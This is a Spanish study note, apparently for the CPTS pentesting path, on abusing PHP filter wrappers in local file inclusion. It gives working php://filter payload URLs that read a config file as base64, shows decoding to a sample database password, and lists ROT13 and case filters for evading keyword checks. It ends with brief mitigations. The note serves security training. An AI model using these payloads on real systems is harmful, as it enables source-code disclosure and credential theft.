# PHP Filters

![CPTS Path](https://img.shields.io/badge/CPTS-Web%20Exploitation-00ff66?style=flat-square&logo=gitbook&logoColor=white)

Los filtros de PHP (`PHP Filters`) son un tipo de wrapper (envoltura) que permite realizar operaciones de filtrado, codificación o decodificación sobre un flujo de datos (stream) antes de que sea leído o escrito por la aplicación. En el contexto de LFI, son extremadamente útiles para divulgar código fuente de archivos PHP sin que el servidor los ejecute.

---

## [+] El Wrapper `php://filter`
Cuando un servidor web procesa un archivo `.php` mediante `include()`, el código se interpreta y solo se muestra el resultado HTML generado. Para extraer el código fuente PHP (como contraseñas de bases de datos, lógica de la app, etc.), podemos usar la codificación Base64 a través del filtro de conversión de PHP.

### Sintaxis General
`php://filter/[categoría_filtro]/[nombre_filtro]/resource=[archivo]`

*   **convert.base64-encode**: Codifica el recurso en Base64.
*   **resource**: Especifica el archivo objetivo que se desea leer.

---

## [>] Vectores Comunes de Explotación

### 1. Lectura de Código Fuente (Base64 Bypass)
Para leer el código fuente de un archivo PHP (por ejemplo, `config.php`) sin que sea ejecutado:
`http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php`

El servidor devolverá el contenido del archivo codificado en Base64:
`PD9waHAgJGRiX3Bhc3MgPSAiU3VwZXJTZWNyZXQxMjMhIjsgPz4=`

Para obtener el código original en texto plano, decodificamos el resultado localmente:
```bash
echo "PD9waHAgJGRiX3Bhc3MgPSAiU3VwZXJTZWNyZXQxMjMhIjsgPz4=" | base64 -d
# Resultado: <?php $db_pass = "SuperSecret123!"; ?>
```

### 2. Filtros de Cadena (String Filters)
Útiles si se quiere manipular el texto directamente o evadir filtros que buscan palabras clave específicas:
*   **Rot13:** `php://filter/read=string.rot13/resource=index.php` (Codifica/decodifica usando ROT13).
*   **Conversión de Mayúsculas/Minúsculas:**
    *   `php://filter/read=string.toupper/resource=index.php`
    *   `php://filter/read=string.tolower/resource=index.php`

---

## [*] Medidas de Mitigación
1.  **Restringir Esquemas:** Deshabilitar o evitar el uso de wrappers en las llamadas de inclusión dinámicas de archivos.
2.  **Lista Blanca:** Validar las entradas de usuario contra un conjunto cerrado de valores seguros.
